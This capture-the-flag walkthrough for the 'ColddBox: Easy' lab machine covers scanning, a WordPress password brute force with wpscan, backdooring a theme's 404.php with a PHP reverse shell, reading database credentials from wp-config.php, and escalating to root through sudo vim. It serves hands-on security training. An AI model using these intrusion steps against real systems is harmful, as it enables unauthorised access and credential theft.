# ColddBox: Easy

An easy level machine with multiple ways to escalate privileges.

# User flag

*Hint: Provide the flag in its encoded format*

## Services

Running a full Nmap scan will reveal 2 open ports, 1 of which on a non standard port (SSH is running on port 4512):

~~~
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Wordpress

Apache is hosting a Wordpress installation. Let's enumerate users and attempt to brute force passwords. 

~~~
kali@kali:/data/vpn$ wpscan --url http://10.10.124.236/ -e u -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.124.236/ [10.10.124.236]
[+] Started: Thu Apr 29 13:22:11 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.124.236/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.124.236/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.124.236/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.124.236/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.124.236/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.124.236/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://10.10.124.236/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.124.236/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.124.236/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=======================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                       
^Cying philip / heyhey Time: 00:25:13 <                                     > (6254 / 57378791)  0.01%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output./ 57378791)  0.01%  ETA: ??:??:??
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Apr 29 13:47:33 2021
[+] Requests Done: 6277
[+] Cached Requests: 47
[+] Data Sent: 2.115 MB
[+] Data Received: 22.922 MB
[+] Memory used: 164.195 MB
[+] Elapsed time: 00:25:22

Scan Aborted: Canceled by User
~~~

I aborted the brute force process after I found valid credentials (`c0ldd:9876543210`) and successfully connected.

## Reverse shell

We'll backdoor the 404 error page of the twentfifteen template (http://10.10.124.236/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen).

Replace the entire content with the PHP source of a PHP reverse shell, and save the modifications.

Then open a listener, and browse the 404.php page (http://10.10.124.236/wp-content/themes/twentyfifteen/404.php).

~~~
kali@kali:/data/ColddBox_Easy$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.124.236] 60738
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:55:56 up 44 min,  0 users,  load average: 0.00, 0.34, 1.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ColddBox-Easy:/$ <Ctrl+Z>
[1]+  Stopped                 rlwrap nc -nlvp 4444
kali@kali:/data/ColddBox_Easy$ stty raw -echo
kali@kali:/data/ColddBox_Easy$ fg
www-data@ColddBox-Easy:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ColddBox-Easy:/$ 
~~~

## c0ldd credentials

Unfortunately, we don't have the permission to read the user flag:

~~~
www-data@ColddBox-Easy:/home/c0ldd$ ls -la
ls -la
total 24
drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 .
drwxr-xr-x 3 root  root  4096 Sep 24  2020 ..
-rw------- 1 c0ldd c0ldd    0 Oct 19  2020 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 Sep 24  2020 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd    0 Oct 14  2020 .bashrc
drwx------ 2 c0ldd c0ldd 4096 Sep 24  2020 .cache
-rw-r--r-- 1 c0ldd c0ldd  655 Sep 24  2020 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 Sep 24  2020 .sudo_as_admin_successful
-rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
~~~

Hopefully, the Worpress configuration file discloses credentials to the database, which may be the same credentials as the user:

~~~
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

~~~

## User flag

We found credentials: `c0ldd:cybersecurity`. Let's try to connect against the SSH service:

~~~
kali@kali:/data/vpn$ ssh c0ldd@10.10.124.236 -p 4512
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
c0ldd@ColddBox-Easy:~$ cat user.txt | base64 -d
Felicidades, primer nivel conseguido!
~~~

User flag: `RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`

# Root flag

*Hint: Provide the flag in its encoded format*

Checking the privileges reveals that we can run a few programs with `sudo` with password, 1 of which being `vim`.

~~~
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
~~~

You can check possible privileges escalation using GTFOBins. Open `vim` with `sudo` and enter the following sequence: `:!/bin/bash` to spawn a root shell.

~~~
c0ldd@ColddBox-Easy:~$ sudo /usr/bin/vim

root@ColddBox-Easy:~# cd /root/
root@ColddBox-Easy:/root# cat root.txt 
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
root@ColddBox-Easy:/root# cat root.txt | base64 -d
¡Felicidades, máquina completada!
~~~

Root flag: `wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=`
